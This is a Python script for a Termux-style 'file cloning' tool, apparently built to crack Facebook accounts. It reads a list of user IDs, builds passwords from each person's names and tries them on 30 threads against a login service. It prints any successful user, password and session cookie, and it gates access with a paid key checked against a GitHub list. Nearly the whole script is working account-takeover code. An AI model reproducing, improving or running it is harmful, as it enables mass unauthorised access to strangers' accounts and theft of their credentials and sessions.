...
try:
    ...
    print('\n \033[1;91m[\033[1;93mrashid-143\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n \033[1;91m[\033[1;93mrashid-143\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
...
while attemps < 12345677901:	
    ...
    if username == 'RASHID' and password == 'ALI':
...
#os.system("xdg-open https://www.facebook.com/gxmingRASHID875?mibextid=ZbWKwL")


def DARKALWAYSONFIRE():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  server = requests.get(f'https://github.com/RASHIDRANA1122/Rashid.txt/blob/main/Rashid.txt').text
  ...
  \033[1;34m|  __ \         | |   (_)   | |
  \033[1;35m| |__) |__ _ ___| |__  _  __| |
  \033[1;36m|  _  // _` / __| '_ \| |/ _` |
  \033[1;35m| | \ \ (_| \__ \ | | | | (_| |
  \033[1;37m|_|  \_\__,_|___/_| |_|_|\__,_|
\033[1;32m(â€¢)=================================================
\033[1;
\033[1;32m(âˆš) \033[1;34mON FACEBOK   : \033[1;34mRashid Sindhi SharðŸ˜
\033[1;32m(âˆš) \033[1;35mON GITHUB    :  \033[1;35m RashidShar100(ðŸ¥€)
\033[1;32m(âˆš) \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS PAID
\033[1;32m(âˆš) \033[1;36mTOOL VIRSION.1.0 :  \033[1;36mRANDOMðŸ‡§ðŸ‡±
\033[1;32m(â€¢)=================================================\x1b[38;5;50m""")
  print(f"Your Key : \033[1;32m"+id)                  
  #print(f"\033[1;37mThis Tool Is paid You Need To Access This Tool")
  #print(f"Send Your Key MESSENGER")
  #os.system(f'xdg-open https://www.facebook.com/gxmingali875?mibextid=ZbWKwL')
  time.sleep(1)
  print(f"\033[1;37mChecking Your Key")
  try:
    httpCaht = requests.get(f"https://github.com/RASHIDRANA1122/Rashid.txt/blob/main/Rashid.txt").text
    if id in httpCaht:
    ...
    if name == '__main__':
        ...
        DARKALWAYSONFIRE()
DARKALWAYSONFIRE() 
#os.system('xdg-open https://github.com/SEFAT-rashid')
def logo():
    os.system('clear')
    print(f""" 
...
\033[1;32m(â€¢)=================================================
\033[1;
\033[1;32m(âˆš) \033[1;34mON FACEBOK   : \033[1;34mRASHID RANA
\033[1;32m(âˆš) \033[1;35mON GITHUB    :  \033[1;35m RASHIDRANA1122
\033[1;32m(âˆš) \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS PAID
\033[1;32m(âˆš) \033[1;36mTOOL VIRSION.1.0 :  \033[1;36m File Clone 
\033[1;32m(â€¢)=================================================""")

def linex():
        print(f"{green}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”")
                     
def rashid():
    os.system('clear');logo()
    m = f"\x1b[38;5;82m[A] START FILE CRACKING\n"
    p = f"\x1b[38;5;84m[B] WHATSAPP CONTACT\n"
    w = f"\x1b[38;5;85m[D] EXIT TOOL"
    L = m + p + w
    print(L)
    __rashid__ = input(f'\x1b[38;5;86m[+] SELECT : {yelloww}')
    if __rashid__ in ['A','a','01','1']:
        __Hasan__()
    
    
    elif __rashid__ in ['B','b','02','2']:
        exit()
    else:
        print(f'\n[Ã—]{rad} CHOOSE VALID OPTION... ');rashid()
        
def __Hasan__():
    global oks,cps
    os.system('clear');logo()
    dfile = input(f'\x1b[38;5;86m[/] EXAMPLE \033[1;91m[sdcard/rashid.txt]\n\x1b[38;5;87m[\] ENTER FILE PATH : ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[Ã—] FILE NOT FOUND...');time.sleep(1);__Hasan__()
    dplist = []
    try:
        os.system('clear');logo()
    ...
    with ThreadPool(max_workers=30) as rashid:
        ...
        for user in dx:
            ...
            passlist = dplist
            rashid.submit(__Fire__,ids,names,passlist)
    print('');linex()
...
def __Fire__(ids,names,passlist):
    global loop,oks,cps
    #r = requests.Session()
    sys.stdout.write(f'\r\r{rad}[{green}FINDING{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}LIVE:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r\033[1;37mâ”Œâ”€\033[1;31m[\033[1;32mSUCCESSFUL\033[1;31m]                      ')
                print(f'\r\r\033[1;37mâ”œâ”€\033[1;31m[\033[1;32mUSER\033[1;31m] - \033[1;32m{ids}                 ')
                print(f'\r\r\033[1;37mâ”œâ”€\033[1;31m[\033[1;32mPASS\033[1;31m] - \033[1;32m{pas}                ')
                print(f'\r\r\033[1;37mâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>   ')
                print(f'\r\r\033[1;37mâ””â”€\033[1;31m[ðŸ’š]â”€> \x1b[38;5;214m{kuki}    ')
